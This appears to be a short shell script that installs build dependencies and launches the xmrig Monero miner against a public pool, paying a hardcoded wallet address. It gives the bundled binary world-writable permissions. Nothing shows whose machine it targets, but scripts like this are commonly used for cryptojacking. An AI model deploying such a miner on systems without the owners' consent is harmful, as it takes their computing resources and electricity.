apt-get -y update
apt-get -y install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev 
chmod 777 x1/xmrig
x1/xmrig --donate-level 1 -o stratum+tcp://xmr.antpool.com:9005 -u 4AzWBLaH4e2MAut9nSMHi4D3ccpY2vqsSA4TBerGmcGM3Gmr89TUqq9QFBevDhzzCPZwSXCUXTXCDZHYVenZscdX9rj2otM -k -a rx/0
